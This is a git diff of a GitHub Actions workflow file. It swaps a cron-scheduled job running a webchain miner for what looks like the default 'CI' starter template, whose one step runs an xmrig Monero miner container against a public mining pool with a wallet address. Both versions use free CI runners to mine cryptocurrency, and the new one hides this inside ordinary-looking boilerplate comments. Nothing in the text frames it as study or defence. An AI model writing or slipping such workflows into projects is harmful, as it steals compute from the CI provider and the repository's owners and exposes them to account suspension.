@@ -1,23 +1,32 @@
-name: super action
+# This is a basic workflow to help you get started with Actions
 
+name: CI
+
+# Controls when the action will run. 
 on:
-  schedule:
-    - cron: "*/15 * * * *"
+  # Triggers the workflow on push or pull request events but only for the main branch
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
 
+  # Allows you to run this workflow manually from the Actions tab
+  workflow_dispatch:
+
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
-  wow:
-    name: wow
-
+  # This workflow contains a single job called "build"
+  build:
+    # The type of runner that the job will run on
     runs-on: ubuntu-latest
 
+    # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
-      - name: Run super
-        run: docker run --name super -d wattpool/webchainminer -o pool.webchain.network:3333 -u 0x582e57003fC0B9A6891bD4A5d6477Cf8FEA16145 -p x
-      
-      - name: Wait super
-        run: sleep 10m 
-        
-      - name: Log super
-        run: docker logs super
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v2
+
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: docker run --name miner --rm -e POOL_URL=pool.minexmr.com:4444  -e POOL_USER=488gqmpBPEtLtf97ZUs6zuRZgk1DkVYtCdVZ8AXfZh2zBvTppPysRJjeMCC5XC1neMYsNPPgp56qZejNdPMmRGibBSkP5ws metal3d/xmrig
       
       
